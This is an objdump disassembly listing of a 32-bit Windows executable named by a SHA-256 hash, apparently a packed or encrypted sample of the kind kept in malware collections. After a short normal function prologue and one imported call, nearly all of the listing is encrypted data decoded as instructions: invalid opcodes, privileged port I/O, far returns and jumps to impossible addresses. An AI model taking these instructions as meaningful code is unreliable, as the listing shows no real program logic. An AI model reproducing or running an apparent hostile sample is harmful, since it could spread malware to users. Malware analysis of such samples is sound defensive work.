
c18548fafaf0e7f025c571deaf29d4cac14b725818714778babc3b0aeff0f121.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	adc    BYTE PTR [edx+0x2fc39a8f],0xcc
  401102:	cmc    
  401103:	bound  eax,QWORD PTR [edi]
  401105:	rcl    DWORD PTR [edi],0x72
  401108:	adc    eax,0x8db36236
  40110d:	jae    0x4010cb
  40110f:	stos   DWORD PTR es:[edi],eax
  401110:	repnz (bad) 
  401112:	adc    ah,BYTE PTR [ebx]
  401114:	jo     0x40114c
  401116:	data16 fisubr WORD PTR [ebp+0xa257424]
  40111d:	push   0xffffffb2
  40111f:	mov    bh,0x5a
  401121:	jo     0x4010be
  401123:	mov    ah,0xae
  401125:	in     al,0xf1
  401127:	jmp    0x4010c0
  401129:	(bad)  
  40112a:	dec    esp
  40112b:	dec    eax
  40112c:	sub    dh,BYTE PTR [eax+0x23830059]
  401132:	retf   0xef2a
  401135:	pop    edx
  401136:	mov    eax,0x16c8d2f3
  40113b:	ds popf 
  40113d:	fnsave [edi+0x9b3b19d]
  401143:	mov    eax,ds:0x7b6ec72f
  401148:	adc    eax,0x8c57bcd8
  40114d:	cld    
  40114e:	ja     0x40116e
  401150:	mov    DWORD PTR [eax],ebp
  401152:	lock push ebx
  401154:	sbb    eax,0xfd40d340
  401159:	cmp    eax,0x159dca25
  40115e:	and    eax,0x73cb4218
  401163:	ror    BYTE PTR [ecx+eax*2-0x77],0x87
  401168:	mov    ebx,0x33b6c21e
  40116d:	xor    eax,0xfe202c02
  401172:	add    ch,BYTE PTR [ebx]
  401174:	jp     0x40113a
  401176:	lods   eax,DWORD PTR ds:[esi]
  401177:	mov    dl,0x73
  401179:	ficomp DWORD PTR [edi-0xa]
  40117c:	repz xor ah,BYTE PTR fs:[edi-0xb]
  401181:	sbb    ecx,DWORD PTR [ebx]
  401183:	arpl   WORD PTR [ebx],bx
  401185:	out    0x20,al
  401187:	dec    ebp
  401188:	inc    edx
  401189:	ret    
  40118a:	adc    ah,0x55
  40118d:	in     eax,0x3
  40118f:	std    
  401190:	sub    BYTE PTR [esi],dl
  401192:	js     0x4011b7
  401194:	add    al,0x12
  401196:	gs pop es
  401198:	data16 in al,dx
  40119a:	jbe    0x4011e1
  40119c:	ja     0x401151
  40119e:	mov    BYTE PTR [esi-0x41da5984],bh
  4011a4:	inc    esi
  4011a5:	push   esp
  4011a6:	xlat   BYTE PTR ds:[ebx]
  4011a7:	mov    ?,WORD PTR [ecx]
  4011a9:	sbb    al,0x7a
  4011ab:	inc    ebp
  4011ac:	add    eax,DWORD PTR [ecx+0x6a]
  4011af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4011b0:	mov    cl,0x60
  4011b2:	pop    edx
  4011b3:	adc    DWORD PTR [esi-0x5a],ebp
  4011b6:	and    DWORD PTR [ebp+0x7],esi
  4011b9:	mov    ds:0x47e0ee25,al
  4011be:	push   es
  4011bf:	push   ebp
  4011c0:	mov    ss,WORD PTR [ecx-0x7f]
  4011c3:	or     eax,0xbcc69fae
  4011c8:	push   ebx
  4011c9:	jle    0x401232
  4011cb:	pop    edi
  4011cc:	or     eax,0x75b19e8
  4011d1:	and    bh,dl
  4011d3:	lock inc ebx
  4011d5:	test   ebp,ecx
  4011d7:	push   esi
  4011d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011d9:	push   ecx
  4011da:	adc    DWORD PTR [esi],ebp
  4011dc:	or     DWORD PTR [edx],0x93dc7342
  4011e2:	xor    DWORD PTR [edx+0x2e],0xfffffff4
  4011e6:	push   ebx
  4011e7:	pop    ss
  4011e8:	and    DWORD PTR [ebp+ebp*1+0x705e9adc],esp
  4011ef:	mov    ecx,0x3b4e699d
  4011f4:	daa    
  4011f5:	jmp    0x89fdce38
  4011fa:	adc    DWORD PTR [ebx-0x14508b21],ebx
  401200:	or     BYTE PTR [ebp+0x6f],bl
  401203:	xor    eax,0xbce6eca3
  401208:	add    al,0x82
  40120a:	xor    al,0x40
  40120c:	sub    ebx,DWORD PTR [edx-0x6b1f7b0d]
  401212:	aam    0x24
  401214:	les    ebx,FWORD PTR [edi-0x54f350be]
  40121a:	(bad)  
  40121b:	fsub   DWORD PTR [ecx-0x37]
  40121e:	outs   dx,DWORD PTR cs:[esi]
  401220:	sar    DWORD PTR [edx-0x6],cl
  401223:	pop    ds
  401224:	xchg   ecx,eax
  401225:	push   0x57
  401227:	stos   BYTE PTR es:[edi],al
  401228:	sbb    dh,BYTE PTR [esi-0x10]
  40122b:	fadd   st(0),st
  40122d:	jecxz  0x4011f9
  40122f:	pop    edx
  401230:	ins    BYTE PTR es:[edi],dx
  401231:	ss (bad) 
  401233:	or     DWORD PTR [ecx],ebx
  401235:	jl     0x401254
  401237:	push   ds
  401238:	loop   0x4011f1
  40123a:	test   al,0xbf
  40123c:	mov    edi,0x44d65608
  401241:	jge    0x401270
  401243:	mov    ds:0xb30a38b2,al
  401248:	xor    DWORD PTR [eax+0xa1a50b4],eax
  40124e:	stos   BYTE PTR es:[edi],al
  40124f:	aad    0x5c
  401251:	mov    cl,0xe6
  401253:	and    ch,ch
  401255:	mov    eax,0x13bd452
  40125a:	add    DWORD PTR [ebx-0x35],0x2b
  40125e:	stos   BYTE PTR es:[edi],al
  40125f:	pop    es
  401260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401261:	xchg   edi,eax
  401262:	sub    BYTE PTR [ebx+0x37],ah
  401265:	sub    eax,0xaafd68f2
  40126a:	push   edx
  40126b:	mov    al,0x9
  40126d:	rcr    BYTE PTR [ecx],0x44
  401270:	test   eax,0xd905245f
  401275:	xchg   edx,eax
  401276:	ror    DWORD PTR [esi+0x2f],0xb2
  40127a:	pop    ecx
  40127b:	aas    
  40127c:	in     al,0x9f
  40127e:	push   edi
  40127f:	add    ecx,DWORD PTR [edx]
  401281:	push   ss
  401282:	out    0xf4,eax
  401284:	sub    al,0xe0
  401286:	stos   BYTE PTR es:[edi],al
  401287:	hlt    
  401288:	xcrypt-cbc (bad)
  401289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40128a:	push   edi
  40128b:	sbb    eax,0x6e2754c4
  401290:	or     DWORD PTR [eax+0x584a53a],edx
  401296:	and    eax,esi
  401298:	lods   al,BYTE PTR ds:[esi]
  401299:	inc    esi
  40129a:	lahf   
  40129b:	jns    0x401308
  40129d:	mov    bl,0x82
  40129f:	push   esi
  4012a0:	and    eax,0xe097090e
  4012a5:	fadd   DWORD PTR [edx+0x4f]
  4012a8:	push   edi
  4012a9:	mov    cl,BYTE PTR [ebp+0x2a]
  4012ac:	sbb    al,0x14
  4012ae:	pop    eax
  4012af:	fs inc ecx
  4012b1:	and    ebp,ebp
  4012b3:	inc    ebp
  4012b4:	push   ecx
  4012b5:	pop    ebp
  4012b6:	mov    ebp,DWORD PTR [esi-0x13]
  4012b9:	shl    DWORD PTR [esi+0x62f70ae5],cl
  4012bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012c0:	lock mov WORD PTR ds:0xb00476da,?
  4012c7:	mov    edi,0x237569df
  4012cc:	xchg   ecx,eax
  4012cd:	dec    ebp
  4012ce:	jecxz  0x401341
  4012d0:	mov    esp,0x636d668
  4012d5:	mov    BYTE PTR [edi],cl
  4012d7:	test   BYTE PTR [edx],dh
  4012d9:	xchg   ebp,eax
  4012da:	ret    
  4012db:	sbb    eax,DWORD PTR [esi+0x72]
  4012de:	out    0xfa,eax
  4012e0:	cmp    DWORD PTR [esi],edi
  4012e2:	pop    ebp
  4012e3:	stc    
  4012e4:	mov    ebp,0xbbfb828
  4012e9:	jp     0x4012e7
  4012eb:	arpl   WORD PTR [edx+0x5acba175],dx
  4012f1:	imul   edi,esp,0xbc552bad
  4012f7:	jp     0x401349
  4012f9:	xchg   esp,eax
  4012fa:	mov    dh,0xb3
  4012fc:	pop    edi
  4012fd:	xchg   ecx,eax
  4012fe:	ins    BYTE PTR es:[edi],dx
  4012ff:	jbe    0x40137b
  401301:	mov    bl,0x0
  401303:	pushf  
  401304:	push   esp
  401305:	push   ss
  401306:	das    
  401307:	fiadd  WORD PTR ds:0xfa691be2
  40130d:	add    eax,DWORD PTR [edx+0x3f]
  401310:	bound  esp,QWORD PTR [esi]
  401312:	jg     0x4012d6
  401314:	addr16 dec eax
  401316:	in     eax,dx
  401317:	pop    edx
  401318:	stc    
  401319:	or     esp,0x40
  40131c:	cmp    al,0xb8
  40131e:	adc    ebx,DWORD PTR [esi-0x74]
  401321:	in     al,dx
  401322:	or     ah,ch
  401324:	xlat   BYTE PTR ds:[ebx]
  401325:	cmp    BYTE PTR [ecx],dl
  401327:	test   bl,0xc9
  40132a:	jns    0x4012de
  40132c:	sub    bl,BYTE PTR [ecx-0x1fb8c5ac]
  401332:	mov    cl,0x54
  401334:	in     eax,0xaf
  401336:	sbb    al,al
  401338:	push   ds
  401339:	imul   ebp,DWORD PTR cs:[ebx-0x51],0xfffffff8
  40133e:	mov    ah,0x91
  401340:	retf   
  401341:	cmp    ebp,edi
  401343:	xchg   DWORD PTR [edx+0x41f550d1],ebp
  401349:	sub    eax,0x4678c7
  40134e:	push   esi
  40134f:	dec    ebx
  401350:	jnp    0x4013a1
  401352:	ds inc ebx
  401354:	sub    DWORD PTR [edi+eax*8],ebp
  401357:	cmove  edi,DWORD PTR [eax-0x28]
  40135b:	jnp    0x4012e0
  40135d:	cdq    
  40135e:	das    
  40135f:	pop    ebx
  401360:	iret   
  401361:	js     0x4013a2
  401363:	int    0x2f
  401365:	sub    BYTE PTR [edx+0x19],bh
  401368:	(bad)  
  401369:	jl     0x401380
  40136b:	hlt    
  40136c:	loopne 0x4013e7
  40136e:	push   ds
  40136f:	push   ebp
  401370:	retf   0x418e
  401373:	push   esi
  401374:	add    BYTE PTR [eax-0x5f8ca2d6],dl
  40137a:	ja     0x401386
  40137c:	lahf   
  40137d:	pusha  
  40137e:	popa   
  40137f:	sti    
  401380:	rol    BYTE PTR [ebx+esi*2],cl
  401383:	or     al,BYTE PTR [edx+eax*2-0x1]
  401387:	popf   
  401388:	int3   
  401389:	xor    al,0x8f
  40138b:	mov    ds:0x21e23198,eax
  401390:	imul   esi,DWORD PTR fs:[edi+0x55788a87],0x7b24605e
  40139b:	and    esi,DWORD PTR [eax-0x416f6fb7]
  4013a1:	jne    0x401333
  4013a3:	shl    DWORD PTR [edx],0xaa
  4013a6:	or     eax,0x3a318eae
  4013ab:	jl     0x4013e0
  4013ad:	or     edx,DWORD PTR [eax+edi*8+0x44]
  4013b1:	sub    DWORD PTR [edx+0x7f61175],edx
  4013b7:	or     ecx,esp
  4013b9:	pop    ss
  4013ba:	inc    BYTE PTR [ecx-0x6fa75b13]
  4013c0:	in     al,dx
  4013c1:	fist   WORD PTR [esi]
  4013c3:	retf   
  4013c4:	sbb    DWORD PTR [ecx],edx
  4013c6:	and    esp,DWORD PTR [edi+0x7169bd6b]
  4013cc:	iret   
  4013cd:	fisttp DWORD PTR [edi+0x119c4882]
  4013d3:	push   edi
  4013d4:	call   0x7fea0034
  4013d9:	xor    DWORD PTR [edi-0x14],ebx
  4013dc:	std    
  4013dd:	mov    dh,0x23
  4013df:	xchg   DWORD PTR [edx-0x369814fc],ecx
  4013e5:	div    DWORD PTR [edi]
  4013e7:	dec    esi
  4013e8:	cdq    
  4013e9:	sub    bl,BYTE PTR [ecx-0x74]
  4013ec:	adc    BYTE PTR [eax],dl
  4013ee:	js     0x401431
  4013f0:	pop    eax
  4013f1:	mov    al,0x88
  4013f3:	mov    cs,ebp
  4013f5:	push   edx
  4013f6:	push   ss
  4013f7:	or     BYTE PTR [edx],al
  4013f9:	test   DWORD PTR [edx-0x42],ebp
  4013fc:	xchg   DWORD PTR [edi+0x10ec52e9],esp
  401402:	mov    ss,WORD PTR [ecx]
  401404:	imul   esi,ecx,0x46
  401407:	ror    DWORD PTR [edx-0x33],0xd9
  40140b:	mov    esi,0x37f3df53
  401410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401411:	dec    esi
  401412:	or     ebx,DWORD PTR [edx+0x48]
  401415:	frstor [ecx-0x1e]
  401418:	adc    edx,DWORD PTR [eax+edx*4-0x41908505]
  40141f:	aaa    
  401420:	int3   
  401421:	retf   0x5e3f
  401424:	jmp    0x34bf4531
  401429:	add    eax,0x20ddd58d
  40142e:	stos   BYTE PTR es:[edi],al
  40142f:	mov    esi,0xd4b60978
  401434:	and    cl,BYTE PTR [eax+0x4bc5dbd4]
  40143a:	xor    eax,0x5ed083fe
  40143f:	sbb    ebx,esp
  401441:	das    
  401442:	jl     0x401405
  401444:	adc    eax,0xbd828f2
  401449:	jne    0x4014b7
  40144b:	adc    al,0xb2
  40144d:	add    eax,0xe6a370a5
  401452:	in     eax,0x4f
  401454:	in     eax,dx
  401455:	out    dx,eax
  401456:	mov    esi,0x1161ada4
  40145b:	inc    edx
  40145c:	xor    al,BYTE PTR [ebx+0x56]
  40145f:	mov    esp,DWORD PTR [esi-0x7a]
  401462:	jmp    0x401435
  401464:	add    BYTE PTR [eax+0x7d],dh
  401467:	adc    esi,ebp
  401469:	sub    dl,al
  40146b:	inc    edi
  40146c:	dec    ebx
  40146d:	dec    eax
  40146e:	mov    esi,0xca275f42
  401473:	lea    ecx,[ecx+0x79]
  401476:	fild   DWORD PTR [ecx]
  401478:	outs   dx,BYTE PTR ds:[esi]
  401479:	pminub mm3,QWORD PTR [eax+0x779d69de]
  401480:	or     BYTE PTR [ecx-0x76],0x1
  401484:	adc    eax,0x2b0838a3
  401489:	fsub   DWORD PTR ds:0x69dd80df
  40148f:	scas   eax,DWORD PTR es:[edi]
  401490:	outs   dx,DWORD PTR ds:[esi]
  401491:	cs test dl,cl
  401494:	fimul  WORD PTR ds:0x3b7095ad
  40149a:	fadd   DWORD PTR [eax+0x2135a6a5]
  4014a0:	xor    DWORD PTR [ebx+0x48923b79],eax
  4014a6:	add    esp,DWORD PTR [edi-0x1b7e2d9f]
  4014ac:	jp     0x4014da
  4014ae:	or     al,0x35
  4014b0:	inc    edx
  4014b1:	or     ecx,esi
  4014b3:	sub    BYTE PTR [ecx+edi*4-0x27559c59],bl
  4014ba:	iret   
  4014bb:	leave  
  4014bc:	push   esi
  4014bd:	mov    ecx,0x54e5ea5d
  4014c2:	fcomp  QWORD PTR [esi-0x79]
  4014c5:	jno    0x401452
  4014c7:	cli    
  4014c8:	jmp    0x9a638b1b
  4014cd:	test   DWORD PTR [ecx-0x2d],edi
  4014d0:	adc    al,0x99
  4014d2:	fmul   QWORD PTR [esi+0x72]
  4014d5:	icebp  
  4014d6:	fs mov ebx,0x2d677f91
  4014dc:	shl    DWORD PTR [ebx+ecx*2],1
  4014df:	push   ds
  4014e0:	popa   
  4014e1:	nop
  4014e2:	jge    0x4014a8
  4014e4:	adc    BYTE PTR ds:0xb7ddfa86,dh
  4014ea:	xor    ch,BYTE PTR [esi]
  4014ec:	xchg   ebx,ecx
  4014ee:	(bad)  
  4014ef:	popa   
  4014f0:	in     al,dx
  4014f1:	mov    ds:0xfc568cf8,al
  4014f6:	mov    ds:0xc54c2227,eax
  4014fb:	imul   esp,edi,0x1efa8003
  401501:	sub    eax,0x4e8a6e81
  401506:	out    dx,al
  401507:	ret    
  401508:	fild   WORD PTR [ebx]
  40150a:	fisttp WORD PTR [ecx+0x2ca3fc63]
  401510:	call   0xcfda0174
  401515:	cmp    DWORD PTR [ebx],0x3bae0608
  40151b:	jbe    0x4014f3
  40151d:	fistp  QWORD PTR [edx+0x2b162fe7]
  401523:	phsubw mm6,QWORD PTR [ebp+0x521e2ed3]
  40152b:	jmp    0x4014ba
  40152d:	rcl    dl,0x10
  401530:	sub    BYTE PTR [eax],bh
  401532:	(bad)  
  401533:	int3   
  401534:	les    eax,FWORD PTR [edx-0x68219449]
  40153a:	dec    eax
  40153b:	gs mov ah,0xa7
  40153e:	pop    esp
  40153f:	cmp    DWORD PTR [ecx+0x4f],ecx
  401542:	imul   ebp,DWORD PTR [eax],0xe18ca29
  401548:	cmp    bh,BYTE PTR [edx+0x1413e56a]
  40154e:	cmp    DWORD PTR [eax+0x619856d6],esp
  401554:	or     edi,DWORD PTR [ecx]
  401556:	push   ebp
  401557:	xchg   ecx,eax
  401558:	jp     0x4015cb
  40155a:	loop   0x40159e
  40155c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40155d:	outs   dx,BYTE PTR ds:[esi]
  40155e:	xchg   esp,eax
  40155f:	nop
  401560:	gs pop ebx
  401562:	pop    ds
  401563:	(bad)  
  401564:	in     al,0xdb
  401566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401567:	push   ds
  401568:	mov    ecx,0xbbad2092
  40156d:	nop
  40156e:	in     al,dx
  40156f:	retf   0xd563
  401572:	pop    ebp
  401573:	sbb    DWORD PTR [edi],0x41ab2cf
  401579:	mov    al,ds:0xf847a141
  40157e:	jl     0x4015ce
  401580:	jne    0x401549
  401582:	out    0xf8,eax
  401584:	jecxz  0x401552
  401586:	dec    ebx
  401587:	test   al,0x75
  401589:	sub    bl,BYTE PTR [edi+0x46]
  40158c:	mov    cl,0xf3
  40158e:	aam    0x3a
  401590:	in     al,dx
  401591:	lods   al,BYTE PTR ds:[esi]
  401592:	jecxz  0x401568
  401594:	or     dl,0x20
  401597:	jg     0x4015fd
  401599:	jp     0x401584
  40159b:	adc    BYTE PTR [eax],bh
  40159d:	int    0xb5
  40159f:	xor    cl,BYTE PTR [edi]
  4015a1:	cld    
  4015a2:	rol    BYTE PTR [edi],1
  4015a4:	jne    0x401595
  4015a6:	mov    bl,ah
  4015a8:	add    eax,0x1e46125e
  4015ad:	push   0x88d206b4
  4015b2:	cmp    eax,0x88f4718a
  4015b7:	cld    
  4015b8:	mov    ebp,0x794084d
  4015bd:	out    dx,eax
  4015be:	mov    dh,0xe9
  4015c0:	(bad)  
  4015c1:	pop    ebx
  4015c2:	pop    ebx
  4015c3:	(bad)  
  4015c4:	int    0x1a
  4015c6:	ror    DWORD PTR ds:0xa428bc83,0xf
  4015cd:	lahf   
  4015ce:	es out 0x6,al
  4015d1:	out    0xd2,al
  4015d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015d4:	or     DWORD PTR [esp+eiz*2+0x11],edi
  4015d8:	push   ds
  4015d9:	mov    ah,0x8a
  4015db:	(bad)  
  4015dc:	pop    esi
  4015dd:	cmp    BYTE PTR [ebx-0x1537c2e8],bh
  4015e3:	enter  0x6246,0xa4
  4015e7:	int    0x6f
  4015e9:	xchg   edx,eax
  4015ea:	inc    esp
  4015eb:	cs gs xor eax,0x2810a3ed
  4015f2:	jne    0x401628
  4015f4:	shl    BYTE PTR [ebx-0x1b7ffcd4],0x73
  4015fb:	loope  0x401622
  4015fd:	out    0xca,eax
  4015ff:	xchg   edx,eax
  401600:	cmp    BYTE PTR [ebp+0x28],cl
  401603:	pop    esp
  401604:	and    al,0xd4
  401606:	into   
  401607:	pop    ebx
  401608:	test   eax,0x9ca4fe30
  40160d:	call   0x3bfae54f
  401612:	popf   
  401613:	setne  dh
  401616:	pop    edx
  401617:	xchg   DWORD PTR [esi-0x4e49b8fa],edx
  40161d:	mov    al,0x5a
  40161f:	mov    ebx,0x5499f4b4
  401624:	outs   dx,BYTE PTR ds:[esi]
  401625:	in     al,dx
  401626:	pop    esi
  401627:	idiv   esp
  401629:	adc    al,0x6
  40162b:	push   edx
  40162c:	xor    DWORD PTR [eax+0x45],0xf
  401630:	push   0xce3b6eaf
  401635:	les    esp,FWORD PTR [eax]
  401637:	xor    BYTE PTR [ebx-0x314afe05],dh
  40163d:	add    ch,BYTE PTR [edx+0x58]
  401640:	(bad)  
  401641:	xchg   edi,eax
  401642:	jb     0x4015f5
  401644:	mov    edx,0x34216d2c
  401649:	dec    ecx
  40164a:	or     ah,BYTE PTR [ecx+ecx*1+0x49dbc4a1]
  401651:	cmp    eax,0x97ca4aaa
  401656:	mov    eax,0x9b39a7c9
  40165b:	fiadd  DWORD PTR [eax+0x2b]
  40165e:	adc    al,0x73
  401660:	pop    ebx
  401661:	aaa    
  401662:	mov    dl,0xe4
  401664:	cmp    eax,DWORD PTR [edx+0x1d]
  401667:	inc    ebx
  401668:	lahf   
  401669:	or     DWORD PTR [esi+0x2f],edx
  40166c:	sahf   
  40166d:	shr    DWORD PTR [ebx+0x1daac6c],0xdc
  401674:	dec    ecx
  401675:	add    al,0x4b
  401677:	fimul  DWORD PTR [esi-0x367fce4b]
  40167d:	(bad)  
  40167e:	clc    
  40167f:	test   BYTE PTR [ebx+0x1cd55c09],cl
  401685:	pop    eax
  401686:	pop    ds
  401687:	cmp    esi,DWORD PTR [ebx-0x42]
  40168a:	dec    ebp
  40168b:	fs test eax,0xea41a7d
  401691:	rol    DWORD PTR [edx+0x7f1a030d],cl
  401697:	retf   0x6d84
  40169a:	ja     0x40166a
  40169c:	mov    eax,0x95e55e6b
  4016a1:	push   edx
  4016a2:	sbb    DWORD PTR [ecx-0x601e7eb2],ebp
  4016a8:	imul   edi,DWORD PTR [edi+0x7f],0x9
  4016ac:	ror    DWORD PTR [esi],1
  4016ae:	cmp    edx,DWORD PTR [ecx+0x65]
  4016b1:	sbb    DWORD PTR [ecx],esp
  4016b3:	daa    
  4016b4:	fbstp  TBYTE PTR [edx+0x70]
  4016b7:	into   
  4016b8:	int    0xf5
  4016ba:	push   esp
  4016bb:	xor    al,0xe5
  4016bd:	adc    ch,dh
  4016bf:	aas    
  4016c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016c1:	push   0xc2b5fc58
  4016c6:	arpl   WORD PTR [esp+eax*8],ax
  4016c9:	ret    
  4016ca:	ins    DWORD PTR es:[edi],dx
  4016cb:	cmc    
  4016cc:	xor    BYTE PTR [ebx],ah
  4016ce:	test   eax,0xb045e05e
  4016d3:	sub    BYTE PTR [ebx+edx*2],ch
  4016d6:	xchg   esi,eax
  4016d7:	and    al,BYTE PTR [ecx-0x39]
  4016da:	xchg   edx,eax
  4016db:	lock lds edi,FWORD PTR [ebp+0x1d]
  4016df:	mov    ds:0x4c7ce1a8,eax
  4016e4:	xchg   BYTE PTR [ebp+0x6eff7c95],dl
  4016ea:	sbb    BYTE PTR [edi-0x7c3ac14f],0xe4
  4016f1:	pop    ebp
  4016f2:	repz les edi,FWORD PTR [ecx]
  4016f5:	cmp    al,0x8c
  4016f7:	(bad)  
  4016f8:	loopne 0x401689
  4016fa:	push   edi
  4016fb:	cmp    eax,0x327b6b52
  401700:	or     al,0x94
  401702:	mov    ds:0x6128bc16,eax
  401707:	push   eax
  401708:	jno    0x40170b
  40170a:	out    0xf3,eax
  40170c:	add    ah,cl
  40170e:	fmul   QWORD PTR [ebx-0x3121800f]
  401714:	imul   esi,DWORD PTR [ecx+0x8f710a7],0x4
  40171b:	xchg   ebp,eax
  40171c:	iret   
  40171d:	and    cl,BYTE PTR [edx]
  40171f:	dec    edx
  401720:	cmp    DWORD PTR [esi+edi*2-0xb],0x1d411a34
  401728:	xchg   BYTE PTR [ebx+ebp*8-0x4c],dl
  40172c:	stc    
  40172d:	and    BYTE PTR ds:0xcbc9714e,0x5d
  401734:	push   ss
  401735:	ret    0xe9be
  401738:	sub    BYTE PTR [eax+0x6c],dh
  40173b:	adc    al,0x64
  40173d:	push   DWORD PTR [ecx+0x3d]
  401740:	and    DWORD PTR [ecx-0x3ba61b1],esp
  401746:	rcl    esi,1
  401748:	in     eax,dx
  401749:	mov    es,WORD PTR [eax+0x7357a212]
  40174f:	js     0x4017bb
  401751:	call   0x37e8:0x6a2bd234
  401758:	jb     0x40172a
  40175a:	js     0x401785
  40175c:	in     eax,0x4e
  40175e:	lods   eax,DWORD PTR ds:[esi]
  40175f:	(bad)  
  401760:	out    dx,eax
  401761:	repnz push 0x6fc30cd3
  401767:	scas   al,BYTE PTR es:[edi]
  401768:	imul   ebp,DWORD PTR [esi-0x52],0xffffffd0
  40176c:	lahf   
  40176d:	push   eax
  40176e:	jb     0x4017d5
  401770:	imul   ebx,DWORD PTR [eax+0x1f],0x21
  401774:	pop    esi
  401775:	pand   mm2,QWORD PTR [eax-0x19451141]
  40177c:	mov    ds:0x2558974e,al
  401781:	shl    dh,cl
  401783:	idiv   ecx
  401785:	cdq    
  401786:	in     eax,0x68
  401788:	mov    DWORD PTR [edx+0x42cbbb16],ecx
  40178e:	in     al,0xe1
  401790:	lds    ebx,FWORD PTR [edx+0x139a3d9d]
  401796:	push   ecx
  401797:	mov    ebp,0xef237ec1
  40179c:	mov    eax,ds:0x3aa0496e
  4017a1:	mov    esp,es
  4017a3:	push   ebp
  4017a4:	inc    edx
  4017a5:	adc    DWORD PTR [edx+0x5f],ecx
  4017a8:	(bad)  
  4017a9:	xchg   ecx,eax
  4017aa:	popa   
  4017ab:	inc    ebp
  4017ac:	push   eax
  4017ad:	pop    esp
  4017ae:	mov    ebp,0x7949b750
  4017b3:	jnp    0x40178b
  4017b5:	pop    ds
  4017b6:	mov    ecx,0x8498f2fe
  4017bb:	loop   0x401775
  4017bd:	mov    eax,0x13095a6e
  4017c2:	sahf   
  4017c3:	div    DWORD PTR [edi]
  4017c5:	push   ebx
  4017c6:	dec    esi
  4017c7:	jne    0x401774
  4017c9:	lods   eax,DWORD PTR ds:[esi]
  4017ca:	(bad)  
  4017cb:	adc    ah,BYTE PTR [edx-0x2e61cdd6]
  4017d1:	mov    dh,0x16
  4017d3:	aad    0xbf
  4017d5:	jno    0x40181f
  4017d7:	jmp    0x401769
  4017d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017da:	aad    0xf4
  4017dc:	jns    0x401812
  4017de:	into   
  4017df:	shl    BYTE PTR [ecx-0xd],cl
  4017e2:	xchg   esi,eax
  4017e3:	std    
  4017e4:	sub    dh,ah
  4017e6:	adc    dh,BYTE PTR [ebx-0x322728f1]
  4017ec:	gs ins BYTE PTR es:[edi],dx
  4017ee:	mov    al,ds:0x67a23416
  4017f3:	bound  esi,QWORD PTR [ebx-0x16]
  4017f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017f7:	jle    0x401852
  4017f9:	add    DWORD PTR [eax],edi
  4017fb:	das    
  4017fc:	push   esi
  4017fd:	dec    eax
  4017fe:	repnz enter 0x65b0,0x2d
  401803:	and    al,0x9d
  401805:	es pop ss
  401807:	test   al,0x8e
  401809:	mov    esp,0xced6cbf6
  40180e:	mov    WORD PTR [ebx+0x220bb609],es
  401814:	pushf  
  401815:	mov    ch,0x24
  401817:	or     dl,dl
  401819:	jns    0x401866
  40181b:	stos   DWORD PTR es:[edi],eax
  40181c:	xchg   esi,eax
  40181d:	fmulp  st(1),st
  40181f:	jecxz  0x4017f2
  401821:	ret    
  401822:	and    bl,BYTE PTR ds:0xd9805d8f
  401828:	aad    0x33
  40182a:	push   ecx
  40182b:	dec    eax
  40182c:	es (bad) 
  40182e:	in     eax,dx
  40182f:	cs mov al,0x4e
  401832:	jnp    0x401852
  401834:	fs or  eax,0x4dac614e
  40183a:	add    eax,0xa00e0bf8
  40183f:	push   ss
  401840:	ret    0x17bb
